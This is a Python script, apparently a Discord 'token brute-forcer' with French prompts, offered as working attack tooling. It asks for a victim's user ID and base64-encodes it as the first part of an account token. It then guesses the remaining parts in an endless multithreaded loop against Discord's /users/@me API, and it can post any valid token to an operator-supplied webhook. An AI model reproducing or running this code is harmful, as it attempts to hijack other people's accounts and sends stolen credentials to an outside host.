import string
import requests
import json
import random
import threading
import base64
import sys
import time

from colorama import Fore, Back, Style, init
import os

os.system('color 4')

menu = f"""
                                              @@@@                @%@@                                      
                                       @@@@@@@@@@@@               @@@@@@@@@@%                               
                                  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                          
                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                         
                                %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                        
                               @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                       
                              @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                      
                             @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     
                            @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                    
                           @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                   
                          %@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@%                  
                          %@@@@@@@@@@@@@@@@        %@@@@@@@@@@@%@        @@@@@@@@@@@@@@@@@                  
                          %@@@@@@@@@@@@@@@          @@@@@@@@@@@@          @@@@@@@@@@@@@@@%                  
                         %@@@@@@@@@@@@@@@@          @@@@@@@@@@@%          %@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@%         @@@@@@@@@@@%         %@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@      %@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@%                 
                         %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 
                         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%                 
                           @%@@@@@@@@@@@@@%@@   @@@@%@@@@@@@@@%%%@%@@  @@@@@@@@@@@@@@@@@@                   
                              @@%@@@@@@@@@@@@@                        @%@@@@@@@@@@@%@@                      
                                   @%@@@@@@@                            @@@@@@%%@                           
                                         @@                              @@     
                                         
                    ╔═════════════════════════════════════════════════════════════════════════╗
                    ║ Trouver Le Token D'un Compte Discord Avec Sont Id (En Mode Brute Force) ║
                    ╚═════════════════════════════════════════════════════════════════════════╝ 
"""

print(menu)

def continuer():
    print("Continuer...")

def reset():
    print("Réinitialisation...")

def verifier_webhook(url):
    if not url.startswith("https://"):
        print("URL de webhook invalide.")
    else:
        print("Webhook validé.")

def erreur_nombre():
    print("Erreur : Nombre de threads invalide.")

def gerer_erreur(e):
    print(f"Erreur détectée : {e}")

try:
    id_utilisateur = input("Entrez l'ID de la victime -> ")
    premiere_partie_token = str(base64.b64encode(id_utilisateur.encode("utf-8")), "utf-8")

    motifs = ["=", "==", "==="]
    for motif in motifs:
        if premiere_partie_token.endswith(motif):
            premiere_partie_token = premiere_partie_token[:-2]
    print("Première partie du token: " + premiere_partie_token)

    brute_force = input("Voulez-vous trouver la deuxième partie par brute-force ? (o/n) -> ")
    if brute_force not in ['o', 'O', 'oui', 'Oui', 'OUI']:
        continuer()
        reset()

    utiliser_webhook = input("Utiliser un webhook ? (o/n) -> ")
    if utiliser_webhook in ['o', 'O', 'oui', 'Oui', 'OUI']:
        url_webhook = input("Entrez l'URL du webhook -> ")
        verifier_webhook(url_webhook)

    try:
        nombre_threads = int(input("Nombre de threads -> "))
    except:
        erreur_nombre()

    def envoyer_webhook(contenu_embed):
        payload = {
            'embeds': [contenu_embed]
        }
        headers = {'Content-Type': 'application/json'}
        requests.post(url_webhook, data=json.dumps(payload), headers=headers)

    def verifier_token():
        premiere_partie = premiere_partie_token
        deuxieme_partie = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
        troisieme_partie = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
        token = f"{premiere_partie}.{deuxieme_partie}.{troisieme_partie}"

        try:
            reponse = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token, 'Content-Type': 'application/json'})
            if reponse.status_code == 200:
                if utiliser_webhook in ['o']:
                    contenu_embed = {
                        'title': 'Token Valide !',
                        'description': f"**Token:**\n```{token}```",
                        'color': 16711680
                    }
                    envoyer_webhook(contenu_embed)
                print(f"\rStatut: Token Valide - {token}", end="")
            else:
                print(f"\rStatut: Token Invalide - {premiere_partie}.{deuxieme_partie}.{troisieme_partie}", end="")
                sys.stdout.flush()
        except:
            print(f"\rStatut: Erreur lors de la vérification du token - {token}", end="")
            sys.stdout.flush()

    def requete():
        threads = []
        try:
            for _ in range(int(nombre_threads)):
                t = threading.Thread(target=verifier_token)
                t.start()
                threads.append(t)
        except:
            erreur_nombre()

        for thread in threads:
            thread.join()

    while True:
        requete()

except Exception as e:
    gerer_erreur(e)
